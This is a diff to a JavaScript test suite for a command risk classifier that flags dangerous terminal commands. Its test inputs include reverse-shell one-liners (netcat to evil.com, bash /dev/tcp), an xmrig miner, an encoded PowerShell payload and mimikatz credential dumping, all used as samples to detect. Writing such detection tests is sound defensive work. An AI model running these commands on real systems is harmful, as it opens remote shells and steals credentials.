@@ -731,9 +731,9 @@ test('rsync to remote is danger', () => {
   assert.equal(classifyRisk(ev, makeConfig()), 'danger');
 });
 
-test('netcat is danger', () => {
+test('netcat reverse shell is critical', () => {
   const ev = makeEvent({ event_type: 'terminal_command', command: 'nc -e /bin/sh evil.com 4444' });
-  assert.equal(classifyRisk(ev, makeConfig()), 'danger');
+  assert.equal(classifyRisk(ev, makeConfig()), 'critical');
 });
 
 test('curl POST (data exfil) is danger', () => {
@@ -6359,6 +6359,64 @@ test('evaluateAlerts fires typosquat alert', () => {
   const ev = makeEvent({ event_type: 'terminal_command', command: 'pip install reqeusts' });
   const alerts = evaluateAlerts(ev, makeConfig());
   assert.ok(alerts.some(a => a.alert_type === 'typosquat'));
+});
+
+test('typosquat alert has critical severity', () => {
+  clearAlertCooldowns();
+  const ev = makeEvent({ session_id: 'crit-test-1', event_type: 'terminal_command', command: 'npm install expresss' });
+  const alerts = evaluateAlerts(ev, makeConfig());
+  const typo = alerts.find(a => a.alert_type === 'typosquat');
+  assert.ok(typo);
+  assert.equal(typo.severity, 'critical');
+});
+
+test('critical_threat alert for reverse shell', () => {
+  clearAlertCooldowns();
+  const ev = makeEvent({ event_type: 'terminal_command', command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' });
+  const alerts = evaluateAlerts(ev, makeConfig());
+  const crit = alerts.find(a => a.alert_type === 'critical_threat');
+  assert.ok(crit);
+  assert.equal(crit.severity, 'critical');
+});
+
+test('critical_threat alert for crypto miner', () => {
+  clearAlertCooldowns();
+  const ev = makeEvent({ event_type: 'terminal_command', command: './xmrig --pool stratum+tcp://pool.minexmr.com:443' });
+  const alerts = evaluateAlerts(ev, makeConfig());
+  const crit = alerts.find(a => a.alert_type === 'critical_threat');
+  assert.ok(crit);
+  assert.equal(crit.severity, 'critical');
+});
+
+test('critical_threat alert for encoded PowerShell payload', () => {
+  clearAlertCooldowns();
+  const ev = makeEvent({ event_type: 'terminal_command', command: 'powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUw==' });
+  const alerts = evaluateAlerts(ev, makeConfig());
+  const crit = alerts.find(a => a.alert_type === 'critical_threat');
+  assert.ok(crit);
+  assert.equal(crit.severity, 'critical');
+});
+
+test('critical_threat alert for credential harvester', () => {
+  clearAlertCooldowns();
+  const ev = makeEvent({ event_type: 'terminal_command', command: 'mimikatz sekurlsa::logonpasswords' });
+  const alerts = evaluateAlerts(ev, makeConfig());
+  const crit = alerts.find(a => a.alert_type === 'critical_threat');
+  assert.ok(crit);
+  assert.equal(crit.severity, 'critical');
+});
+
+test('critical_threat does not false positive on normal commands', () => {
+  clearAlertCooldowns();
+  const ev = makeEvent({ event_type: 'terminal_command', command: 'npm install express && node server.js' });
+  const alerts = evaluateAlerts(ev, makeConfig());
+  assert.ok(!alerts.some(a => a.alert_type === 'critical_threat'));
+});
+
+test('classifyRiskWithReasons returns critical for reverse shell', () => {
+  const ev = makeEvent({ event_type: 'terminal_command', command: 'nc -e /bin/sh 10.0.0.1 1234' });
+  const result = classifyRiskWithReasons(ev, makeConfig());
+  assert.equal(result.level, 'critical');
 });
 
 // ══════════════════════════════════════════════════
